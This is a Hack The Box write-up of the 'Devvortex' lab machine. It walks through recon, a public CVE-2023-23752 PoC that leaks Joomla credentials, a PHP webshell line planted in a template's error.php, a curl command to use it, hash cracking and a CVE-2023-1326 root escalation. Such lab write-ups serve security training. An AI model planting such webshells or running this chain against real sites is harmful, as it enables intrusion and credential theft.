---
title: "Devvortex - Writeup"
classes: single
ribbon: LightBlue
categories:
  - writeup
tags:
  - writeups
  - pentest
  - writeup
  - oscp
  - shell
  - exploit
  - htb
  - hackthebox
  - machine
  - easy
  - linux
toc: true
hide_title: true
excerpt: ""
sidebar:
        nav: "menu_writeups"
---

## Devvortex
![](https://kar0nx.github.io/assets/images/writeup/2565d292772abc4a2d774117cf4d36ff.png)
## Reconnaissance

IP: 10.10.11.242
## NMAP

```
nmap -T4 -p- -A 10.10.11.242
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-28 06:09 UTC
Nmap scan report for 10.10.11.242
Host is up (0.030s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devvortex.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1723/tcp)
HOP RTT      ADDRESS
1   29.46 ms 10.10.14.1
2   29.69 ms 10.10.11.242

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.47 seconds

```

Again only 2 ports open so sth must be in http.

## Website
### Site

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250828081100.png)

Nothing interesting in page no interesting directories, so let's search for subdomains

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250828082423.png)

And we have dev.devvortex.htb

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250828082530.png)

I used feroxbuster and found /administrator directory

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250828083717.png)

tried few default credential but without results.

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250828083902.png)

from my notes I enumerated version

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250828084021.png)

navigate do /administrator/manifest/files/joomla.xml

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250828084039.png)

and we got version 4.2.6, now let's search for exploits. I found promising CVE-2023-23752
https://github.com/Acceis/exploit-CVE-2023-23752
And go step by step with PoC

```
ruby exploit.rb http://dev.devvortex.htb
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250828084600.png)

we have 2 users and 1 password from db

```
lewis P4ntherg0t1n5r3c0n##
```

now we can log into /administrator with above credentials

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250828084854.png)

## Gaining Access

Refering to my notes from HTB Academy I start attacking chain for joomla:

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250828085626.png)

navigate to System/Templates and add webshell to error.php 

```
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250828085901.png)

and we have web shell 

```
curl -s http://dev.devvortex.htb/templates/cassiopeia/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id
```

Now let's edit error.php to get reverse shell I user PentestMonkey

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250828092241.png)

and make error to redirect to error.php like /administrator/asdfasdfa

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250828092227.png)

We are in

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

earlier we gather user and password for DB so let's try mysql

```
mysql -u lewis -p
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250828093838.png)

Simply enumerate DB and we can spot users

```
show databases;
use joomla
show tables;
select * from sd4fg_users
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250828093854.png)

we got hash for logan account.
hashcat identify hash as module 3200 and cracked hash

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250828094058.png)

logan  tequieromucho

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250828094218.png)

Now we can connect via SSH to machine

## Privilege Escalation

Starting with sudo -l 

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250828094524.png)

That is vulnerable to CVE-2023-1326 and I found poc for this 
https://vk9-sec.com/cve-2023-1326privilege-escalation-apport-cli-2-26-0/

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250828095307.png)

Just followed article step by step and I got root access.